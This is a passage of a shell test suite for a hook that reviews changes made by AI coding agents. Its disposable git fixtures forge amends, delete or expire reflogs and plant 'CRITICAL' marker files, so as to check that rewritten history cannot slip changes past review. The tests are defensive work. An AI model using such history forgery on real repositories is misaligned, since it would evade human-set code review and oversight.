    jq -e '.diff | contains("+CRITICAL = 5")' "$B10_D2_STATE/payload" >/dev/null || return 1
    [ "$before" = "$(cat "$completed")" ] || return 1
  done
}

b10_r11_upstream_case() {
  local kind="$1" harness size f n branch record calls_before
  for harness in claude codex; do
      for size in small large; do
        b10_d2_fixture "$harness" "-r11-$kind-$size"
        b10_r10_critical_reviewer
        branch=$(git -C "$B10_D2_PROJECT" symbolic-ref --short HEAD)
        git -C "$B10_D2_PROJECT" add -- '*.py'
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm base
        git -C "$B10_D2_PROJECT" checkout -qb upstream
        printf 'CRITICAL_UPSTREAM = 1\n' > "$B10_D2_PROJECT/up_crit.py"
        if [ "$size" = large ]; then
          "$B10_D2_REAL_PYTHON" -I -c 'import pathlib,sys; pathlib.Path(sys.argv[1]).write_text("upstream = 12345678901234567890\n" * 12000)' "$B10_D2_PROJECT/upstream_data.py"
        fi
        git -C "$B10_D2_PROJECT" add -- '*.py'
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm upstream-first
        if [ "$kind" = reset-two-ahead ] || [ "$kind" = forged-two ] || [ "$kind" = forged-chain ]; then
          printf 'upstream second\n' > "$B10_D2_PROJECT/up-history.txt"
          git -C "$B10_D2_PROJECT" add up-history.txt
          git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm upstream-second
        fi
        git -C "$B10_D2_PROJECT" checkout -q "$branch"
        printf 'local\n' > "$B10_D2_PROJECT/local-history.txt"
        git -C "$B10_D2_PROJECT" add local-history.txt
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm local
        case "$kind" in forged-*)
          printf 'local second\n' >> "$B10_D2_PROJECT/local-history.txt"
          git -C "$B10_D2_PROJECT" add local-history.txt
          git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm local-second ;;
        esac
        for f in alpha beta gamma; do printf 'first_reviewed = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
        calls_before=$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')
        # These history operations are confined to this disposable fixture,
        # never the lane checkout. Preserve the exact agent edits via stash.
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com stash push -qm agent-edits
        if [ "$kind" = switch-amend ]; then
          git -C "$B10_D2_PROJECT" checkout -q upstream
          GIT_COMMITTER_DATE='2030-01-01T00:00:00Z' git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --amend --no-edit -q
        elif [[ "$kind" = forged-* ]]; then
          if [ "$kind" = forged-chain ]; then
            # The forged amend itself shares its predecessor's parent. This
            # isolates the global first-parent guard without disabling the
            # new per-amend check: two plumbing updates, no reflog file edit.
            local middle tree parent
            tree=$(git -C "$B10_D2_PROJECT" rev-parse 'upstream^{tree}')
            parent=$(git -C "$B10_D2_PROJECT" rev-parse 'upstream^1')
            middle=$(git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit-tree "$tree" -p "$parent" -m plumbing-intermediate)
            git -C "$B10_D2_PROJECT" update-ref -m 'commit: intermediate' HEAD "$middle"
          fi
          git -C "$B10_D2_PROJECT" update-ref -m 'commit (amend): fake' HEAD upstream
          git -C "$B10_D2_PROJECT" read-tree --reset -u HEAD
        else git -C "$B10_D2_PROJECT" reset --hard upstream >/dev/null; fi
        git -C "$B10_D2_PROJECT" stash pop -q
        for f in alpha beta gamma; do printf 'agent = 2\n' >> "$B10_D2_PROJECT/$f.py"; done
        for n in 1 2; do
          b10_d2_review
          [ "$status" -eq 0 ] || { printf '%s/%s/%s/%s: %s\n' "$harness" "$kind" "$size" "$n" "$output" >&3; return 1; }
          [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq "$((calls_before + 1))" ] || return 1
          jq -e '.diff | contains("+agent = 2") and (contains("up_crit.py") | not) and (contains("upstream_data.py") | not)' "$B10_D2_STATE/payload" >/dev/null || return 1
        done
        jq -e '.incomplete == false' "$record" >/dev/null || return 1
      done
  done
}

@test "B10 D2 R8 M-2: stash reset to a sibling upstream never attributes foreign content" {
  b10_r11_upstream_case reset-sibling
}

@test "B10 D2 R8 L-k: switch then amend never treats checkout crossings as local rewrites" {
  b10_r11_upstream_case switch-amend
}

@test "B10 D2 R8 L-k: reset hard to a two-commit-ahead upstream retains first-parent protection" {
  b10_r11_upstream_case reset-two-ahead
}

@test "B10 D2 R8 L-j: unprovable local folds announce lost coverage once and remain nonblocking" {
  local harness kind f record branch n stamp
  for harness in claude codex; do
    for kind in interactive-fixup no-reflog expired many-amends noop-checkout; do
      b10_d2_fixture "$harness" "-r11-unproved-$kind"
      b10_r10_critical_reviewer
      branch=$(git -C "$B10_D2_PROJECT" symbolic-ref --short HEAD)
      git -C "$B10_D2_PROJECT" add -- '*.py'
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm base
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --allow-empty -qm rewrite-target
      for f in alpha beta gamma; do printf 'first_reviewed = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
      if [ "$kind" = no-reflog ]; then
        git -C "$B10_D2_PROJECT" config core.logAllRefUpdates false
        rm -f -- "$B10_D2_PROJECT/.git/logs/HEAD"
      fi
      printf 'CRITICAL_FOLDED = 3\n' > "$B10_D2_PROJECT/crit.py"
      printf '\000EVIL-folded' > "$B10_D2_PROJECT/evil.dat"
      git -C "$B10_D2_PROJECT" add -- '*.py' '*.dat'
      if [ "$kind" = interactive-fixup ]; then
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --fixup HEAD -q
        GIT_SEQUENCE_EDITOR=/usr/bin/true GIT_EDITOR=/usr/bin/true GIT_COMMITTER_DATE='2030-01-01T00:00:00Z' git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com rebase -i --autosquash HEAD~2 >/dev/null 2>&1
      else
        GIT_COMMITTER_DATE='2030-01-01T00:00:00Z' git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --amend -qm folded-content
      fi
      case "$kind" in
        expired) git -C "$B10_D2_PROJECT" reflog expire --expire=now --all ;;
        many-amends)
          for n in {1..40}; do
            printf -v stamp '2030-01-01T00:01:%02dZ' "$n"
            GIT_COMMITTER_DATE="$stamp" git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --amend --no-edit -q
          done ;;
        noop-checkout) git -C "$B10_D2_PROJECT" checkout -q "$branch" ;;
      esac
      for f in alpha beta gamma; do printf 'agent = 2\n' >> "$B10_D2_PROJECT/$f.py"; done
      b10_d2_review
      [ "$status" -eq 0 ] || { printf '%s/%s: status=%s %s / %s\n' "$harness" "$kind" "$status" "$output" "$stderr" >&3; return 1; }
      printf '%s' "$output" | jq -se 'length == 1 and (.[0].decision != "block") and (.[0] | (.additionalContext // .systemMessage) | contains("coverage base lost"))' >/dev/null || { printf '%s/%s: %s\n' "$harness" "$kind" "$output" >&3; return 1; }
      jq -e '.incomplete == true and .coverage_base_lost == true' "$record" >/dev/null || return 1
      # Same lost covered base is announced once, not once per Stop.
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [[ "$output$stderr" != *'coverage base lost'* ]] || return 1
      jq -e '.incomplete == false' "$record" >/dev/null || return 1
      if [ "$kind" = no-reflog ]; then
        # The latch is per covered base, not a permanent global suppression.
        git -C "$B10_D2_PROJECT" add -- alpha.py beta.py gamma.py
        GIT_COMMITTER_DATE='2031-01-01T00:00:00Z' git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --amend --no-edit -q
        for f in alpha beta gamma; do printf 'new_base = 3\n' >> "$B10_D2_PROJECT/$f.py"; done
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        [[ "$output$stderr" == *'coverage base lost'* ]] || return 1
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        [[ "$output$stderr" != *'coverage base lost'* ]] || return 1
      fi
    done
  done
}

@test "B10 D2 R8 L-j: a lost-base announcement is not repeated when the reviewer initially fails" {
  local harness f branch record n
  for harness in claude codex; do
    b10_d2_fixture "$harness" -r11-lost-review-failure
    git -C "$B10_D2_PROJECT" add -- '*.py'
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm base
    for f in alpha beta gamma; do printf 'first_reviewed = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
    git -C "$B10_D2_PROJECT" config core.logAllRefUpdates false
    rm -f -- "$B10_D2_PROJECT/.git/logs/HEAD"
    git -C "$B10_D2_PROJECT" add -- '*.py'
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --amend -qm folded
    for f in alpha beta gamma; do printf 'agent = 2\n' >> "$B10_D2_PROJECT/$f.py"; done
    cp "$B10_D2_TOOLS/reviewer" "$B10_D2_TOOLS/reviewer.saved"
    cat > "$B10_D2_TOOLS/reviewer" <<'R11_FAIL'
#!/bin/bash
cat >/dev/null
printf '%s\n' 'malformed review'
R11_FAIL
    for n in 1 2; do
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      if [ "$n" -eq 1 ]; then
        printf '%s' "$output" | jq -se 'length == 1 and (.[0] | (.additionalContext // .systemMessage) | contains("coverage base lost"))' >/dev/null || { printf '%s/failure/%s: %s / %s\n' "$harness" "$n" "$output" "$stderr" >&3; return 1; }
      else [[ "$output$stderr" != *'coverage base lost'* ]] || return 1; fi
    done
    cp "$B10_D2_TOOLS/reviewer.saved" "$B10_D2_TOOLS/reviewer"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [[ "$output$stderr" != *'coverage base lost'* ]] || return 1
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [[ "$output$stderr" != *'coverage base lost'* ]] || return 1
    jq -e '.incomplete == false' "$record" >/dev/null || return 1
  done
}

@test "B10 D2 R9 L-m: forged one-ahead amend must match the replaced HEAD parent" {
  b10_r11_upstream_case forged-one
}

@test "B10 D2 R9 L-m: forged two-ahead amend does not attribute upstream content" {
  b10_r11_upstream_case forged-two
}

@test "B10 D2 R9 L-m: first-parent guard independently rejects parent-matched forged amend chains" {
  b10_r11_upstream_case forged-chain
}

@test "B10 D2 R9 M-3: autonomy changes review committed critical text from the covered base at the new level" {
  local harness level f record completed before calls_before
  for harness in claude codex; do
    for level in 2 4; do
      b10_d2_fixture "$harness" "-r12-context-$level"
      b10_r10_critical_reviewer
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
      completed="${record%/*}/reviewed.$harness"; before=$(cat "$completed")
      calls_before=$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')
      printf 'CRITICAL_COMMITTED = 1\n' > "$B10_D2_PROJECT/evil.py"
      git -C "$B10_D2_PROJECT" add -- '*.py'
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm committed-before-context-change
      mkdir -p "$B10_D2_PROJECT/.claude"
      printf '%s\n' "$level" > "$B10_D2_PROJECT/.claude/session-autonomy"
      for f in alpha beta gamma; do printf 'agent = 2\n' >> "$B10_D2_PROJECT/$f.py"; done
      b10_d2_review
      if [ "$harness" = claude ]; then [ "$status" -eq 2 ] || return 1; else [ "$status" -eq 0 ] || return 1; fi
      printf '%s' "$output" | jq -e '.decision == "block"' >/dev/null || return 1
      jq -e --argjson level "$level" '.autonomy_level == $level and (.diff | contains("+CRITICAL_COMMITTED = 1"))' "$B10_D2_STATE/payload" >/dev/null || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq "$((calls_before + 1))" ] || return 1
      [ "$before" = "$(cat "$completed")" ] || return 1
      [[ "$output$stderr" != *'coverage base lost'* ]] || return 1
    done
  done
}

@test "B10 D2 R9 L-l: known blocked files remain reviewed across repeated unproved folds and HEAD notices do not loop" {
  local harness kind f record capture n
  for harness in claude codex; do
    for kind in no-reflog interactive-fixup; do
      b10_d2_fixture "$harness" "-r12-pending-$kind"
      b10_r10_critical_reviewer
      git -C "$B10_D2_PROJECT" add -- '*.py'
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm base
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --allow-empty -qm target
      for f in alpha beta gamma; do printf 'first_reviewed = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
      capture="${record%/*}/capture.$harness.json"
      if [ "$kind" = no-reflog ]; then
        git -C "$B10_D2_PROJECT" config core.logAllRefUpdates false
        rm -f -- "$B10_D2_PROJECT/.git/logs/HEAD"
      fi
      printf 'folded = 1\n' > "$B10_D2_PROJECT/x.py"
      for n in 1 2; do
        git -C "$B10_D2_PROJECT" add -- '*.py'
        if [ "$kind" = no-reflog ]; then
          GIT_COMMITTER_DATE="203$n-01-01T00:00:00Z" git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --amend -qm "unproved-$n"
        else
          git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --fixup HEAD -q
          GIT_SEQUENCE_EDITOR=/usr/bin/true GIT_EDITOR=/usr/bin/true GIT_COMMITTER_DATE="203$n-01-01T00:00:00Z" git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com rebase -i --autosquash HEAD~2 >/dev/null 2>&1
        fi
        for f in alpha beta gamma; do printf 'agent = %s\n' "$n" >> "$B10_D2_PROJECT/$f.py"; done
        if [ "$n" -eq 1 ]; then printf 'CRITICAL_DIRTY = 1\n' >> "$B10_D2_PROJECT/alpha.py"; fi
        b10_d2_review
        if [ "$harness" = claude ]; then [ "$status" -eq 2 ] || return 1; else [ "$status" -eq 0 ] || return 1; fi
        printf '%s' "$output" | jq -e '.decision == "block" and (.reason | contains("coverage base lost"))' >/dev/null || return 1
        jq -e '.diff | contains("+CRITICAL_DIRTY = 1")' "$B10_D2_STATE/payload" >/dev/null || return 1
        jq -e '.verdict == "block" and (.reviewed_files | index("alpha.py") != null)' "$capture" >/dev/null || return 1
      done
      # The same HEAD still blocks on the actual file payload, but the lost
      # notice cannot repeat forever or substitute for reviewing that file.
      b10_d2_review
      if [ "$harness" = claude ]; then [ "$status" -eq 2 ] || return 1; else [ "$status" -eq 0 ] || return 1; fi
      printf '%s' "$output" | jq -e '.decision == "block"' >/dev/null || return 1
      [[ "$output$stderr" != *'coverage base lost'* ]] || return 1
      jq -e '.diff | contains("+CRITICAL_DIRTY = 1")' "$B10_D2_STATE/payload" >/dev/null || return 1
      "$B10_D2_REAL_PYTHON" -I - "$B10_D2_PROJECT/alpha.py" <<'PENDING_FIXED'
from pathlib import Path
import sys
p=Path(sys.argv[1]);p.write_text(''.join(line for line in p.read_text().splitlines(True) if not line.startswith('CRITICAL_DIRTY')))
PENDING_FIXED
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      jq -e '.diff | contains("+CRITICAL_DIRTY = 1") | not' "$B10_D2_STATE/payload" >/dev/null || return 1
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [[ "$output$stderr" != *'coverage base lost'* ]] || return 1
      jq -e '.incomplete == false' "$record" >/dev/null || return 1
    done
  done
}

@test "B10 D2 L3: exclusion lists larger than Linux per-argument limits use files not argv" {
  local harness n
  for harness in claude codex; do
    b10_d2_fixture "$harness" -large-exclusions
    cat > "$B10_D2_TOOLS/jq" <<'JQ_ARG_LIMIT'
#!/bin/bash
for arg do
  if [ "${#arg}" -gt 131071 ]; then
    printf 'oversized argv\n' >> "$B10_D2_STATE/oversized-argv"
    exit 7
  fi
done
exec "$B10_D2_REAL_JQ" "$@"
JQ_ARG_LIMIT
    chmod +x "$B10_D2_TOOLS/jq"
    "$B10_D2_REAL_PYTHON" -I - "$B10_D2_PROJECT" <<'LARGE_EXCLUSIONS'
from pathlib import Path
import sys
root = Path(sys.argv[1]) / ('dir-' + '\\' * 180)
root.mkdir()
for i in range(240): (root / ('shot-%03d-' % i + '\\' * 180 + '.png')).touch()
LARGE_EXCLUSIONS
    for n in 1 2 3; do
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
      b10_d2_no_completion || return 1
    done
    [ ! -e "$B10_D2_STATE/oversized-argv" ] || return 1
    jq -e '(.excluded_paths | length) == 240 and (.excluded_paths | tojson | utf8bytelength) > 131072' "$B10_D2_STATE/payload" >/dev/null || return 1
  done
}

@test "B10 D2 N3: clean reviews of Git-detected tracked dat and image never complete opaque coverage" {
  local harness name record
  for harness in claude codex; do
    for name in tracked.dat logo.png; do
      b10_d2_fixture "$harness" "-$name"
      printf '\000before' > "$B10_D2_PROJECT/$name"
      git -C "$B10_D2_PROJECT" add -- "$name"
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm binary
      printf '\000after' > "$B10_D2_PROJECT/$name"
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
      b10_d2_no_completion || return 1
      record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
      jq -e --arg name "$name" '.incomplete == true and (.excluded | index($name) != null)
        and (.reviewed_files | index($name) == null) and (.reviewed_files | index("alpha.py") != null)' "$record" >/dev/null || return 1
    done
  done
}

@test "B10 D2 N4: below-threshold opaque paths produce no notice or reviewer call" {
  local harness
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    rm -f -- "$B10_D2_PROJECT/beta.py" "$B10_D2_PROJECT/gamma.py"
    printf '\000png' > "$B10_D2_PROJECT/shot.png"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ -z "$output$stderr" ] || return 1
    [ ! -e "$B10_D2_STATE/calls" ] || return 1
    b10_d2_no_completion || return 1
  done
}

@test "B10 D2 N6: legacy copied hooks resolve from their own directory or explain failure in one line" {
  local harness legacy resolver f
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    legacy="$BATS_TEST_TMPDIR/legacy-$harness/.$harness/hooks"
    mkdir -p "$legacy/lib" "$legacy/../../scripts/lib"
    cp "$B10_D2_HOOKS/code-review-subagent.sh" "$legacy/code-review-subagent.sh"
    for f in deps.sh autonomy.sh code-reviewer.sh; do cp "$B10_D2_HOOKS/lib/$f" "$legacy/lib/$f"; done
    resolver="$legacy/../../scripts/lib/trellis-python.sh"
    cp "$B10_D2_ROOT/scripts/lib/trellis-python.sh" "$resolver"
    B10_D2_HOOKS="$legacy"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
    # Only this private fixture's resolver is removed, never a user payload.
    rm -f -- "$resolver"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    printf '%s' "$output" | jq -se 'length == 1 and (.[0] | (.additionalContext // .systemMessage) | contains("resolver") and contains("unavailable"))' >/dev/null || return 1
    [[ "$stderr" == *resolver*unavailable*relative*hook*directory* ]] || return 1
    [ "$(printf '%s\n' "$stderr" | wc -l | tr -d ' ')" -eq 1 ] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
  done
}

@test "B10 D2 N7: non-UTF8 filename is individually excluded while text is reviewed once" {
  local harness n
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    run "$B10_D2_REAL_PYTHON" -I -c 'import os,sys; fd=os.open(os.fsencode(sys.argv[1])+b"/file-\xff",os.O_CREAT|os.O_WRONLY,0o600); os.write(fd,b"opaque"); os.close(fd)' "$B10_D2_PROJECT"
    [ "$status" -eq 0 ] || skip 'filesystem rejects non-UTF8 filenames'
    for n in 1 2 3; do
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
      [[ "$stderr" == *file-*UNREVIEWED* ]] || return 1
      b10_d2_no_completion || return 1
    done
    jq -e '.excluded_paths | index("file-\\udcff") != null' "$B10_D2_STATE/payload" >/dev/null || return 1
  done
}

@test "B10 D2: untracked count budget runs before shadow-index hashing" {
  local harness
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    python3 -I -c 'import pathlib,sys
p=pathlib.Path(sys.argv[1])
for n in range(257): (p/("file-%03d.py"%n)).touch()' "$B10_D2_PROJECT"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [[ "$output$stderr" == *UNREVIEWED* ]] || return 1
    [ ! -e "$B10_D2_STATE/calls" ] || return 1
    [ ! -e "$B10_D2_STATE/content-trace" ] || return 1
    b10_d2_no_completion || return 1
  done
}

@test "B10 D2: exact completed tree is looked up before any full-diff render or hash" {
  local harness
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ -e "$B10_D2_STATE/calls" ] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
    : > "$B10_D2_STATE/render-trace"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ ! -s "$B10_D2_STATE/render-trace" ] || { cat "$B10_D2_STATE/render-trace"; return 1; }
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
    printf 'def later():\n    return 2\n' >> "$B10_D2_PROJECT/alpha.py"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 2 ] || return 1
    jq -e '.diff | contains("+def later")' "$B10_D2_STATE/payload" >/dev/null || return 1
  done
}

@test "B10 D2: old capture state and changed autonomy context cannot skip review" {
  local harness record head tree context
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    record=$(find "$B10_D2_STATE" -name "reviewed.$harness" -type f -print -quit)
    read -r head tree context < "$record"
    printf '%s %s\n' "$head" "$tree" > "$record"
    # Exercise the legacy upgrade path, not a still-valid v3 capture.
    find "$B10_D2_STATE" -type f \( -name "capture.$harness.json" -o -name "covered.$harness.json" \) -delete
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 2 ] || return 1
    mkdir -p "$B10_D2_PROJECT/.claude"
    printf '5\n' > "$B10_D2_PROJECT/.claude/session-autonomy"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 3 ] || return 1
    jq -e '.autonomy_level == 5 and (.diff | contains("+def alpha"))' "$B10_D2_STATE/payload" >/dev/null || return 1
  done
}

@test "B10 D2: returning to an exactly reviewed tree clears only its unmet notice" {
  local harness notice
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    python3 -I -c 'import pathlib,sys; pathlib.Path(sys.argv[1]).write_bytes(b"x\n"*120000)' "$B10_D2_PROJECT/oversized.py"
    b10_d2_review
    [[ "$output$stderr" == *UNREVIEWED* ]] || return 1
    rm -f -- "${B10_D2_PROJECT:?}/oversized.py"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
    notice=$(find "$B10_D2_STATE" -name 'unmet.capture.*' -type f -print -quit)
    [ -z "$notice" ] || return 1
  done
}

@test "B10 D2: bounded streamed payload keeps under-cap untracked source and capture-tree identity" {
  local harness record actual expected idx context
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    printf 'old\n' > "$B10_D2_PROJECT/deleted.py"
    mkdir -p "$B10_D2_PROJECT/.claude/hooks"
    printf 'old hook\n' > "$B10_D2_PROJECT/.claude/hooks/tracked.sh"
    git -C "$B10_D2_PROJECT" add deleted.py .claude/hooks/tracked.sh
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm tracked
    # Real-index staged deletion plus tracked harness edit must survive the
    # disposable-index accelerator; untracked harness state stays excluded.
    git -C "$B10_D2_PROJECT" rm -q deleted.py
    printf 'new hook\n' >> "$B10_D2_PROJECT/.claude/hooks/tracked.sh"
    printf 'state\n' > "$B10_D2_PROJECT/.claude/untracked-state"
    printf 'value = 3\n' > "$B10_D2_PROJECT/file with spaces.py"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    jq -e '.diff | contains("+def alpha") and contains("+def beta") and contains("+def gamma")' "$B10_D2_STATE/payload" >/dev/null || return 1
    record=$(find "$B10_D2_STATE" -name "reviewed.$harness" -type f -print -quit)
    [ -n "$record" ] || return 1
    read -r _ actual context < "$record"
    idx="$B10_D2_STATE/reference-index"
    expected=$(cd "$B10_D2_PROJECT" && export GIT_INDEX_FILE="$idx" && git read-tree HEAD && git add -u && git add -A -- ':/' ':(exclude,top).claude' ':(exclude,top).codex' && git write-tree) || return 1
    [ "$actual" = "$expected" ] || return 1
  done
  ! grep -Eq '^[[:space:]]*(FULL_DIFF|CR_DELTA|DIFF|REVIEW_PAYLOAD)=\$\(' "$B10_D2_ROOT/core-rules/hooks/code-review-subagent.sh" || return 1
  ! grep -Eq '^[[:space:]]*(FULL_DIFF|CR_DELTA|DIFF|REVIEW_PAYLOAD)=\$\(' "$B10_D2_ROOT/core-rules/codex/hooks/code-review-subagent.sh" || return 1
}
# END LANE B10

# BEGIN LANE B11
# END LANE B11

# BEGIN LANE C0
# END LANE C0

# BEGIN LANE C1
# END LANE C1

# BEGIN LANE C2
# END LANE C2

# BEGIN LANE C3
# END LANE C3

# BEGIN LANE C4
# END LANE C4

# BEGIN LANE serial-tail
# END LANE serial-tail
